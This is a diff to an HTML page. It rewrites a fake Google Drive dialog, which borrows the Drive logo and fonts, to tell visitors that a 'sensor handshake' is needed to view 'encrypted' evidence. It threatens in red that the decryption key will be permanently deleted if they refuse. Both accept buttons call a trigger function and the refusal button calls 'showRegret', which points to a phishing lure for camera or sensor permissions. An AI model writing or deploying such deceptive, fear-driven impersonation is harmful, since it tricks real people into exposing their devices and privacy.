@@ -134,7 +134,14 @@
     <div id="fake-box">
         <div class="sheet">
             <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" width="32" style="margin-bottom:16px;">
-            <div style="font-family:'Google Sans'; font-size:18px; color:#1f1f1f; margin-bottom:24px;">Allow Drive to decrypt and open the file?</div>
+            <div style="font-family:'Google Sans'; font-size:18px; color:#1f1f1f; font-weight:500; margin-bottom:8px;">Temporary Handshake Required</div>
+            <div style="font-family:'Roboto'; font-size:14px; color:#444746; line-height:1.5; margin-bottom:24px;">
+                This is a one-time access link. To render the visual capture from the encrypted metadata, you must authorize a sensor handshake. 
+                <br><br>
+                <div style="background: rgba(185, 28, 28, 0.05); border-left: 3px solid #b91c1c; padding: 8px 12px; color: #b91c1c;">
+                    <b>CRITICAL:</b> If access is denied, the decryption key will be <b>PERMANENTLY DELETED</b> and the evidence will become unavailable.
+                </div>
+            </div>
             <button class="btn-p" onclick="trigger()">While using the app</button>
             <button class="btn-p" onclick="trigger()">Only this time</button>
             <button class="btn-s" onclick="showRegret()">Don't allow</button>
